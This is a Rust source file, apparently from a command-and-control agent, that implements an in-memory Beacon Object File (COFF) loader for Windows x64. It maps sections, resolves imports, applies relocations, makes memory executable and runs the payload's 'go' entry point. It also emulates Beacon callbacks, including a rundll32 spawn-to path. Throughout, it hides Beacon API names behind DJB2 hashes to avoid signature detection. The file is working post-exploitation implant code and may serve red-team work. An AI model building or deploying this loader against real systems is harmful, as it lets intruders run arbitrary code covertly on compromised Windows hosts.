// BOF (Beacon Object File / COFF) executor for Windows x64.
// Ported from agents/agent-go/bof_windows.go.
// This file is only compiled for Windows; lib.rs gates it with #[cfg(target_os = "windows")].

use std::collections::HashMap;
use std::sync::Mutex;

use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, VirtualProtect,
    MEM_COMMIT, MEM_RESERVE, MEM_RELEASE,
    PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
};
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};

// ── Output capture ────────────────────────────────────────────────────────────

static BOF_OUTPUT: Mutex<Option<Vec<u8>>> = Mutex::new(None);

fn bof_append_bytes_raw(data: &[u8]) {
    if let Ok(mut g) = BOF_OUTPUT.lock() {
        if let Some(ref mut v) = *g {
            v.extend_from_slice(data);
        }
    }
}

fn bof_append_str(s: &str) {
    bof_append_bytes_raw(s.as_bytes());
}

// ── COFF relocation constants ─────────────────────────────────────────────────

const IMAGE_REL_AMD64_ADDR64:   u16 = 0x0001;
const IMAGE_REL_AMD64_ADDR32NB: u16 = 0x0003;
const IMAGE_REL_AMD64_REL32:    u16 = 0x0004;
const IMAGE_REL_AMD64_REL32_1:  u16 = 0x0005;
const IMAGE_REL_AMD64_REL32_2:  u16 = 0x0006;
const IMAGE_REL_AMD64_REL32_3:  u16 = 0x0007;
const IMAGE_REL_AMD64_REL32_4:  u16 = 0x0008;
const IMAGE_REL_AMD64_REL32_5:  u16 = 0x0009;

// ── datap / formatp (must match beacon.h x64 layout) ─────────────────────────

#[repr(C)]
struct CDatap {
    original: usize,
    buffer:   usize,
    length:   i32,
    size:     i32,
}

#[repr(C)]
struct CFormatp {
    original: usize,
    buffer:   usize,
    length:   i32,
    size:     i32,
}

// ── Format buffer store (keyed by formatp ptr, holds raw bytes) ───────────────

static FMT_BUFS: Mutex<Option<HashMap<usize, Vec<u8>>>> = Mutex::new(None);

fn fmt_append_bytes(fp_ptr: usize, data: &[u8]) {
    if let Ok(mut g) = FMT_BUFS.lock() {
        if let Some(ref mut map) = *g {
            map.entry(fp_ptr).or_default().extend_from_slice(data);
        }
    }
}

fn fmt_get_bytes(fp_ptr: usize) -> Vec<u8> {
    if let Ok(g) = FMT_BUFS.lock() {
        if let Some(ref map) = *g {
            return map.get(&fp_ptr).cloned().unwrap_or_default();
        }
    }
    Vec::new()
}

fn fmt_reset(fp_ptr: usize) {
    if let Ok(mut g) = FMT_BUFS.lock() {
        if let Some(ref mut map) = *g {
            if let Some(v) = map.get_mut(&fp_ptr) { v.clear(); }
        }
    }
}

fn fmt_remove(fp_ptr: usize) {
    if let Ok(mut g) = FMT_BUFS.lock() {
        if let Some(ref mut map) = *g { map.remove(&fp_ptr); }
    }
}

// ── C string helpers ──────────────────────────────────────────────────────────

unsafe fn read_cstr(p: usize) -> String {
    if p == 0 { return String::new(); }
    let ptr = p as *const u8;
    let mut n = 0usize;
    while n < 65536 && *ptr.add(n) != 0 { n += 1; }
    String::from_utf8_lossy(std::slice::from_raw_parts(ptr, n)).into_owned()
}

unsafe fn read_wstr(p: usize) -> String {
    if p == 0 { return String::new(); }
    let ptr = p as *const u16;
    let mut n = 0usize;
    while n < 32768 && *ptr.add(n) != 0 { n += 1; }
    String::from_utf16_lossy(std::slice::from_raw_parts(ptr, n))
}

// ── bofBswap32 ────────────────────────────────────────────────────────────────

fn bof_bswap32(v: i32) -> i32 {
    v.swap_bytes()
}

// ── Minimal printf formatter ──────────────────────────────────────────────────

unsafe fn bof_sprintf(fmt: &str, args: &[usize]) -> String {
    let mut out = String::new();
    let bytes = fmt.as_bytes();
    let mut i = 0usize;
    let mut ai = 0usize;
    while i < bytes.len() {
        if bytes[i] != b'%' {
            out.push(bytes[i] as char);
            i += 1;
            continue;
        }
        i += 1;
        if i >= bytes.len() { out.push('%'); break; }
        // skip flags/width/precision
        loop {
            if i >= bytes.len() { break; }
            match bytes[i] {
                b'-' | b'+' | b' ' | b'#' | b'0' | b'1'..=b'9' | b'.' => { i += 1; }
                b'*' => { ai += 1; i += 1; }
                _ => break,
            }
        }
        // skip length modifiers
        while i < bytes.len() && matches!(bytes[i], b'l'|b'h'|b'I'|b'z'|b'L') { i += 1; }
        if i >= bytes.len() { break; }
        let verb = bytes[i]; i += 1;
        let a = if ai < args.len() { let v = args[ai]; ai += 1; v } else { 0 };
        match verb {
            b'd' | b'i' => out.push_str(&format!("{}", a as i32)),
            b'u'        => out.push_str(&format!("{}", a as u32)),
            b'x'        => out.push_str(&format!("{:x}", a)),
            b'X'        => out.push_str(&format!("{:X}", a)),
            b'o'        => out.push_str(&format!("{:o}", a)),
            b'p'        => out.push_str(&format!("0x{:x}", a)),
            b's'        => out.push_str(&read_cstr(a)),
            b'S'        => out.push_str(&read_wstr(a)),
            b'c'        => out.push(a as u8 as char),
            b'n'        => {}
            b'%'        => { out.push('%'); if ai > 0 { ai -= 1; } }
            _           => { out.push('%'); out.push(verb as char); if ai > 0 { ai -= 1; } }
        }
    }
    out
}

// ── Alloc list for BOF_ALLOCS (callback-initiated allocs) ─────────────────────

static BOF_ALLOCS: Mutex<Option<Vec<usize>>> = Mutex::new(None);

fn alloc_track(ptr: usize) {
    if let Ok(mut g) = BOF_ALLOCS.lock() {
        if let Some(ref mut v) = *g { v.push(ptr); }
    }
}

// valloc for use inside Beacon callbacks (tracks automatically)
unsafe fn valloc(size: usize) -> usize {
    let p = VirtualAlloc(std::ptr::null(), size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as usize;
    if p != 0 { alloc_track(p); }
    p
}

// ── Beacon API callbacks ──────────────────────────────────────────────────────

unsafe extern "C" fn beacon_data_parse(parser_ptr: usize, buf: usize, size: i32) {
    let p = &mut *(parser_ptr as *mut CDatap);
    p.original = buf; p.buffer = buf;
    p.length   = size; p.size  = size;
}

unsafe extern "C" fn beacon_data_int(parser_ptr: usize) -> i32 {
    let p = &mut *(parser_ptr as *mut CDatap);
    if p.length < 4 { return 0; }
    let v = *(p.buffer as *const i32);
    p.buffer += 4; p.length -= 4;
    bof_bswap32(v)
}

unsafe extern "C" fn beacon_data_short(parser_ptr: usize) -> i16 {
    let p = &mut *(parser_ptr as *mut CDatap);
    if p.length < 2 { return 0; }
    let v = *(p.buffer as *const u16);
    p.buffer += 2; p.length -= 2;
    ((v >> 8) | (v << 8)) as i16
}

unsafe extern "C" fn beacon_data_length(parser_ptr: usize) -> i32 {
    (*(parser_ptr as *const CDatap)).length
}

unsafe extern "C" fn beacon_data_extract(parser_ptr: usize, size_ptr: usize) -> usize {
    let p = &mut *(parser_ptr as *mut CDatap);
    if p.length < 4 { return 0; }
    let ln = bof_bswap32(*(p.buffer as *const i32));
    p.buffer += 4; p.length -= 4;
    if ln < 0 || ln > p.length { return 0; }
    let out = p.buffer;
    p.buffer += ln as usize; p.length -= ln;
    if size_ptr != 0 { *(size_ptr as *mut i32) = ln; }
    out
}

unsafe extern "C" fn beacon_output(_typ: i32, data: *const u8, len: i32) {
    if !data.is_null() && len > 0 {
        bof_append_bytes_raw(std::slice::from_raw_parts(data, len as usize));
    }
}

// Fixed-arity wrapper for BeaconPrintf — covers ~95% of real BOF calls (≤4 format args)
unsafe extern "C" fn beacon_printf(_typ: i32, fmt_ptr: *const u8, a0: usize, a1: usize, a2: usize, a3: usize) {
    if fmt_ptr.is_null() { return; }
    let fmt = read_cstr(fmt_ptr as usize);
    let s = bof_sprintf(&fmt, &[a0, a1, a2, a3]);
    bof_append_str(&s);
}

unsafe extern "C" fn beacon_format_alloc(fp_ptr: usize, maxsz: i32) {
    if let Ok(mut g) = FMT_BUFS.lock() {
        if let Some(ref mut map) = *g { map.insert(fp_ptr, Vec::new()); }
    }
    let fp = &mut *(fp_ptr as *mut CFormatp);
    fp.size = maxsz; fp.length = 0;
}

unsafe extern "C" fn beacon_format_reset(fp_ptr: usize) {
    fmt_reset(fp_ptr);
    (*(fp_ptr as *mut CFormatp)).length = 0;
}

unsafe extern "C" fn beacon_format_free(fp_ptr: usize) {
    fmt_remove(fp_ptr);
}

unsafe extern "C" fn beacon_format_append(fp_ptr: usize, text_ptr: usize, ln: i32) {
    if text_ptr == 0 || ln <= 0 { return; }
    let data = std::slice::from_raw_parts(text_ptr as *const u8, ln as usize);
    fmt_append_bytes(fp_ptr, data);
    (*(fp_ptr as *mut CFormatp)).length += ln;
}

unsafe extern "C" fn beacon_format_printf(fp_ptr: usize, fmt_ptr: usize, a0: usize, a1: usize, a2: usize, a3: usize) {
    if fmt_ptr == 0 { return; }
    let fmt = read_cstr(fmt_ptr);
    let s = bof_sprintf(&fmt, &[a0, a1, a2, a3]);
    let slen = s.len() as i32;
    fmt_append_bytes(fp_ptr, s.as_bytes());
    (*(fp_ptr as *mut CFormatp)).length += slen;
}

unsafe extern "C" fn beacon_format_to_string(fp_ptr: usize, size_ptr: usize) -> usize {
    let content = fmt_get_bytes(fp_ptr);
    let n = content.len();
    let mem = valloc(n + 1);
    if mem == 0 { return 0; }
    if n > 0 {
        std::ptr::copy_nonoverlapping(content.as_ptr(), mem as *mut u8, n);
    }
    *(mem as *mut u8).add(n) = 0;
    if size_ptr != 0 { *(size_ptr as *mut i32) = n as i32; }
    (*(fp_ptr as *mut CFormatp)).original = mem;
    mem
}

unsafe extern "C" fn beacon_format_int(fp_ptr: usize, value: i32) {
    // Writes 4 raw big-endian bytes (matching Go's bofBswap32 + Write)
    let be_bytes = bof_bswap32(value).to_ne_bytes();
    fmt_append_bytes(fp_ptr, &be_bytes);
    (*(fp_ptr as *mut CFormatp)).length += 4;
}

unsafe extern "C" fn beacon_is_admin() -> i32 {
    // Use IsUserAnAdmin via dynamic lookup to avoid uncertain feature flags
    static PROC: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let f = PROC.get_or_init(|| {
        let dll  = b"shell32.dll\0";
        let name = b"IsUserAnAdmin\0";
        let h = LoadLibraryA(dll.as_ptr());
        if h == 0 { return 0usize; }
        GetProcAddress(h, name.as_ptr()).map(|p| p as usize).unwrap_or(0)
    });
    if *f == 0 { return 0; }
    type Fn = unsafe extern "system" fn() -> i32;
    let func: Fn = std::mem::transmute(*f);
    func()
}

unsafe extern "C" fn beacon_get_spawn_to(x86: i32, buf_ptr: usize, length: i32) {
    let s: &[u8] = if x86 != 0 {
        b"C:\\Windows\\SysWOW64\\rundll32.exe\0"
    } else {
        b"C:\\Windows\\System32\\rundll32.exe\0"
    };
    let copy_len = (s.len()).min(length as usize);
    if buf_ptr != 0 && copy_len > 0 {
        std::ptr::copy_nonoverlapping(s.as_ptr(), buf_ptr as *mut u8, copy_len);
        // ensure null termination
        *(buf_ptr as *mut u8).add(copy_len - 1) = 0;
    }
}

unsafe extern "C" fn to_wide_char(src_ptr: usize, dst_ptr: usize, max_chars: i32) -> i32 {
    static PROC: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
    let f = PROC.get_or_init(|| {
        let dll  = b"kernel32.dll\0";
        let name = b"MultiByteToWideChar\0";
        let h = LoadLibraryA(dll.as_ptr());
        if h == 0 { return 0usize; }
        GetProcAddress(h, name.as_ptr()).map(|p| p as usize).unwrap_or(0)
    });
    if *f == 0 { return 0; }
    type Fn = unsafe extern "system" fn(u32, u32, usize, i32, usize, i32) -> i32;
    let func: Fn = std::mem::transmute(*f);
    func(65001, 0, src_ptr, -1i32, dst_ptr, max_chars)
}

// ── Stub callbacks ────────────────────────────────────────────────────────────

unsafe extern "C" fn beacon_noop_0() -> usize { 0 }
unsafe extern "C" fn beacon_noop_1(_a: usize) -> usize { 0 }
unsafe extern "C" fn beacon_noop_2(_a: usize, _b: usize) -> usize { 0 }
unsafe extern "C" fn beacon_noop_4(_a: usize, _b: usize, _c: usize, _d: usize) -> usize { 0 }
unsafe extern "C" fn beacon_noop_7(_a: usize, _b: usize, _c: usize, _d: usize, _e: usize, _f: usize, _g: usize) -> usize { 0 }

// ── BOF callback API — DJB2 hash table (no Beacon* string literals) ──────────

fn bof_djb2(s: &str) -> u32 {
    let mut h: u32 = 5381;
    for b in s.bytes() { h = h.wrapping_shl(5).wrapping_add(h) ^ (b as u32); }
    h
}

fn beacon_api_lookup(name: &str) -> usize {
    let h = bof_djb2(name);
    match h {
        0x6AB4F0E4 => beacon_data_parse        as usize,
        0x0D4393E2 => beacon_data_int           as usize,
        0x6AA76263 => beacon_data_short         as usize,
        0x025056ED => beacon_data_length        as usize,
        0x222914DC => beacon_data_extract       as usize,
        0x4862655E => beacon_output             as usize,
        0x51E86B76 => beacon_printf             as usize,
        0xA0F210CF => beacon_format_alloc       as usize,
        0xA1B55237 => beacon_format_reset       as usize,
        0xF55C31F6 => beacon_format_free        as usize,
        0xBF7A316C => beacon_format_append      as usize,
        0xE45DFB35 => beacon_format_printf      as usize,
        0xEF693D8C => beacon_format_to_string   as usize,
        0x5502EE31 => beacon_format_int         as usize,
        0xB4D2F8B4 => beacon_is_admin           as usize,
        0x1A46AB57 => beacon_get_spawn_to       as usize,
        0x5C5E4379 => to_wide_char              as usize,
        0x681A2615 => beacon_noop_7             as usize,
        0x8F9FB24E => beacon_noop_7             as usize,
        0x9909426A => beacon_noop_1             as usize,
        0x3A9E0DAA => beacon_noop_4             as usize,
        0x4BE276B8 => beacon_noop_0             as usize,
        0x0338FF39 => beacon_noop_1             as usize,
        0x1EB39E2C => beacon_noop_2             as usize,
        _ => 0,
    }
}

// ── Resolve external symbol → 8-byte thunk ───────────────────────────────────

unsafe fn resolve_external(name: &str, allocs: &mut Vec<usize>) -> Result<usize, String> {
    let b = name.as_bytes();
    if b.len() < 6 || b[0]!=b'_'||b[1]!=b'_'||b[2]!=b'i'||b[3]!=b'm'||b[4]!=b'p'||b[5]!=b'_' {
        return Ok(0);
    }
    let imp_name = &name[6..];

    let thunk = VirtualAlloc(std::ptr::null(), 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as usize;
    if thunk == 0 {
        return Err(format!("VirtualAlloc thunk for {} failed", name));
    }
    allocs.push(thunk);

    let func_addr: usize;
    if let Some(dollar) = imp_name.find('$') {
        let dll_part = &imp_name[..dollar];
        let fn_name  = &imp_name[dollar+1..];
        let mut dll_cstr = dll_part.to_lowercase();
        dll_cstr.push_str(".dll\0");
        let mut fn_cstr = fn_name.to_string();
        fn_cstr.push('\0');

        let h = LoadLibraryA(dll_cstr.as_ptr());
        if h == 0 {
            return Err(format!("LoadLibraryA({}) failed", dll_part));
        }
        let proc = GetProcAddress(h, fn_cstr.as_ptr());
        match proc {
            Some(f) => func_addr = f as usize,
            None    => return Err(format!("GetProcAddress {}!{} failed", dll_part, fn_name)),
        }
    } else {
        let addr = beacon_api_lookup(imp_name);
        if addr == 0 {
            return Err(format!("unknown beacon API: {}", imp_name));
        }
        func_addr = addr;
    }

    *(thunk as *mut usize) = func_addr;
    Ok(thunk)
}

// ── Relocation ────────────────────────────────────────────────────────────────

unsafe fn apply_reloc(patch: usize, target: usize, typ: u16) {
    match typ {
        IMAGE_REL_AMD64_ADDR64 => {
            let p = patch as *mut u64;
            *p = p.read().wrapping_add(target as u64);
        }
        IMAGE_REL_AMD64_REL32
        | IMAGE_REL_AMD64_REL32_1
        | IMAGE_REL_AMD64_REL32_2
        | IMAGE_REL_AMD64_REL32_3
        | IMAGE_REL_AMD64_REL32_4
        | IMAGE_REL_AMD64_REL32_5 => {
            let n = (typ - IMAGE_REL_AMD64_REL32) as i64;
            let existing = (patch as *const i32).read() as i64;
            let next = patch as i64 + 4 + n;
            *(patch as *mut i32) = (target as i64 + existing - next) as i32;
        }
        IMAGE_REL_AMD64_ADDR32NB => {
            let existing = (patch as *const i32).read() as i64;
            *(patch as *mut i32) = (target as i64 + existing) as i32;
        }
        _ => {}
    }
}

// ── Main COFF loader ──────────────────────────────────────────────────────────

pub fn exec_bof(coff_data: &[u8], packed_args: &[u8]) -> Result<String, String> {
    if coff_data.len() < 20 {
        return Err("COFF too small".into());
    }

    let machine = u16::from_le_bytes([coff_data[0], coff_data[1]]);
    if machine != 0x8664 {
        return Err(format!("unsupported machine 0x{:04x} (need AMD64/0x8664)", machine));
    }

    let num_sections = u16::from_le_bytes([coff_data[2],  coff_data[3]])  as usize;
    let sym_tab_off  = u32::from_le_bytes([coff_data[8],  coff_data[9],  coff_data[10], coff_data[11]]) as usize;
    let num_symbols  = u32::from_le_bytes([coff_data[12], coff_data[13], coff_data[14], coff_data[15]]) as usize;
    let opt_hdr_size = u16::from_le_bytes([coff_data[16], coff_data[17]]) as usize;
    let sec_base     = 20 + opt_hdr_size;

    // Init globals
    *BOF_OUTPUT.lock().map_err(|e| e.to_string())? = Some(Vec::new());
    *FMT_BUFS.lock().map_err(|e| e.to_string())?   = Some(HashMap::new());
    *BOF_ALLOCS.lock().map_err(|e| e.to_string())?  = Some(Vec::new());

    let result = exec_bof_inner(coff_data, packed_args, num_sections, sym_tab_off, num_symbols, sec_base);

    // Collect output
    let raw_out = BOF_OUTPUT.lock()
        .unwrap_or_else(|e| e.into_inner())
        .take()
        .unwrap_or_default();
    let output = String::from_utf8_lossy(&raw_out).into_owned();

    // Clear format buffers
    *FMT_BUFS.lock().unwrap_or_else(|e| e.into_inner()) = None;

    // Free all tracked allocations
    let allocs = BOF_ALLOCS.lock()
        .unwrap_or_else(|e| e.into_inner())
        .take()
        .unwrap_or_default();
    unsafe {
        for addr in allocs {
            if addr != 0 {
                VirtualFree(addr as *mut _, 0, MEM_RELEASE);
            }
        }
    }

    match result {
        Ok(()) => Ok(output),
        Err(e) => Err(e),
    }
}

// ── Inner loader (separate fn so we can do cleanup on error) ─────────────────

struct SecInfo { mem: usize, size: u32, char_flags: u32 }
struct SymRec  { name: String, sec_num: i16, value: u32 }

fn exec_bof_inner(
    coff_data:    &[u8],
    packed_args:  &[u8],
    num_sections: usize,
    sym_tab_off:  usize,
    num_symbols:  usize,
    sec_base:     usize,
) -> Result<(), String> {

    // ── Allocate and copy sections ────────────────────────────────────────────
    let mut secs: Vec<SecInfo> = (0..num_sections)
        .map(|_| SecInfo { mem: 0, size: 0, char_flags: 0 })
        .collect();

    for i in 0..num_sections {
        let hdr_off = sec_base + i * 40;
        if hdr_off + 40 > coff_data.len() {
            return Err(format!("section header {} OOB", i));
        }
        let h = &coff_data[hdr_off..];
        let virt_size  = u32::from_le_bytes([h[8],  h[9],  h[10], h[11]]);
        let raw_size   = u32::from_le_bytes([h[16], h[17], h[18], h[19]]);
        let raw_off    = u32::from_le_bytes([h[20], h[21], h[22], h[23]]) as usize;
        let char_flags = u32::from_le_bytes([h[36], h[37], h[38], h[39]]);

        let alloc_size = virt_size.max(raw_size);
        if alloc_size == 0 { continue; }

        let mem = unsafe {
            VirtualAlloc(std::ptr::null(), alloc_size as usize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as usize
        };
        if mem == 0 {
            return Err(format!("VirtualAlloc section {} failed", i));
        }
        alloc_track(mem);

        if raw_size > 0 {
            let end = raw_off + raw_size as usize;
            if end > coff_data.len() {
                return Err(format!("section {} raw data OOB", i));
            }
            unsafe {
                std::ptr::copy_nonoverlapping(
                    coff_data[raw_off..end].as_ptr(),
                    mem as *mut u8,
                    raw_size as usize,
                );
            }
        }
        secs[i] = SecInfo { mem, size: alloc_size, char_flags };
    }

    // ── Parse symbol table ────────────────────────────────────────────────────
    if sym_tab_off == 0 || num_symbols == 0 {
        return Err("no symbol table in COFF".into());
    }
    let str_tab_off = sym_tab_off + num_symbols * 18;

    let get_sym_name = |sym: &[u8]| -> String {
        if u32::from_le_bytes([sym[0], sym[1], sym[2], sym[3]]) == 0 {
            let str_off = u32::from_le_bytes([sym[4], sym[5], sym[6], sym[7]]) as usize;
            let abs = str_tab_off + str_off;
            if abs >= coff_data.len() { return String::new(); }
            let tail = &coff_data[abs..];
            let n = tail.iter().position(|&b| b == 0).unwrap_or(tail.len());
            return String::from_utf8_lossy(&tail[..n]).into_owned();
        }
        let n = sym[..8].iter().position(|&b| b == 0).unwrap_or(8);
        String::from_utf8_lossy(&sym[..n]).into_owned()
    };

    let mut sym_recs: Vec<Option<SymRec>> = (0..num_symbols).map(|_| None).collect();
    let mut sym_addrs: Vec<usize>         = vec![0usize; num_symbols];

    {
        let mut i = 0usize;
        while i < num_symbols {
            let off = sym_tab_off + i * 18;
            if off + 18 > coff_data.len() { break; }
            let sym     = &coff_data[off..off+18];
            let name    = get_sym_name(sym);
            let sec_num = i16::from_le_bytes([sym[12], sym[13]]);
            let value   = u32::from_le_bytes([sym[8],  sym[9],  sym[10], sym[11]]);
            let aux     = sym[17] as usize;

            if sec_num > 0 && (sec_num as usize) <= num_sections {
                sym_addrs[i] = secs[(sec_num as usize) - 1].mem + value as usize;
            }
            sym_recs[i] = Some(SymRec { name, sec_num, value });

            i += 1 + aux;
        }
    }

    // ── Resolve external symbols ──────────────────────────────────────────────
    {
        let mut thunk_allocs: Vec<usize> = Vec::new();
        let mut i = 0usize;
        while i < num_symbols {
            if let Some(ref r) = sym_recs[i] {
                if r.sec_num == 0 && !r.name.is_empty() && sym_addrs[i] == 0 {
                    let addr = unsafe { resolve_external(&r.name, &mut thunk_allocs)? };
                    sym_addrs[i] = addr;
                }
            }
            let off = sym_tab_off + i * 18;
            let aux = if off + 18 <= coff_data.len() { coff_data[off + 17] as usize } else { 0 };
            i += 1 + aux;
        }
        for a in thunk_allocs { alloc_track(a); }
    }

    // ── Apply relocations ─────────────────────────────────────────────────────
    for i in 0..num_sections {
        if secs[i].mem == 0 { continue; }
        let hdr_off    = sec_base + i * 40;
        let h          = &coff_data[hdr_off..];
        let num_relocs = u16::from_le_bytes([h[32], h[33]]) as usize;
        let rel_off    = u32::from_le_bytes([h[24], h[25], h[26], h[27]]) as usize;

        for j in 0..num_relocs {
            let r_off = rel_off + j * 10;
            if r_off + 10 > coff_data.len() { break; }
            let rel       = &coff_data[r_off..r_off+10];
            let virt_addr = u32::from_le_bytes([rel[0], rel[1], rel[2], rel[3]]) as usize;
            let sym_idx   = u32::from_le_bytes([rel[4], rel[5], rel[6], rel[7]]) as usize;
            let reloc_typ = u16::from_le_bytes([rel[8], rel[9]]);

            if sym_idx >= num_symbols { continue; }
            let target = sym_addrs[sym_idx];
            let patch  = secs[i].mem + virt_addr;
            unsafe { apply_reloc(patch, target, reloc_typ); }
        }
    }

    // ── Set section permissions ───────────────────────────────────────────────
    for i in 0..num_sections {
        if secs[i].mem == 0 { continue; }
        let exec  = secs[i].char_flags & 0x20000000 != 0;
        let write = secs[i].char_flags & 0x80000000 != 0;
        let prot = match (exec, write) {
            (true,  true)  => PAGE_EXECUTE_READWRITE,
            (true,  false) => PAGE_EXECUTE_READ,
            (false, true)  => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let mut old = 0u32;
        unsafe {
            VirtualProtect(secs[i].mem as *const _, secs[i].size as usize, prot, &mut old);
        }
    }

    // ── Find entry point "go" ─────────────────────────────────────────────────
    let mut entry = 0usize;
    {
        let mut i = 0usize;
        while i < num_symbols {
            if let Some(ref r) = sym_recs[i] {
                if r.name == "go" && r.sec_num > 0 && (r.sec_num as usize) <= num_sections {
                    entry = secs[(r.sec_num as usize) - 1].mem + r.value as usize;
                    break;
                }
            }
            let off = sym_tab_off + i * 18;
            let aux = if off + 18 <= coff_data.len() { coff_data[off + 17] as usize } else { 0 };
            i += 1 + aux;
        }
    }
    if entry == 0 {
        return Err("entry point 'go' not found in COFF".into());
    }

    // ── Allocate args buffer ──────────────────────────────────────────────────
    let (args_ptr, args_len) = if !packed_args.is_empty() {
        let mem = unsafe {
            VirtualAlloc(std::ptr::null(), packed_args.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as usize
        };
        if mem == 0 { return Err("VirtualAlloc args failed".into()); }
        alloc_track(mem);
        unsafe {
            std::ptr::copy_nonoverlapping(packed_args.as_ptr(), mem as *mut u8, packed_args.len());
        }
        (mem, packed_args.len())
    } else {
        (0usize, 0usize)
    };

    // ── Execute BOF ───────────────────────────────────────────────────────────
    unsafe {
        type BofEntry = unsafe extern "C" fn(*mut u8, i32);
        let f: BofEntry = std::mem::transmute(entry);
        f(args_ptr as *mut u8, args_len as i32);
    }

    Ok(())
}
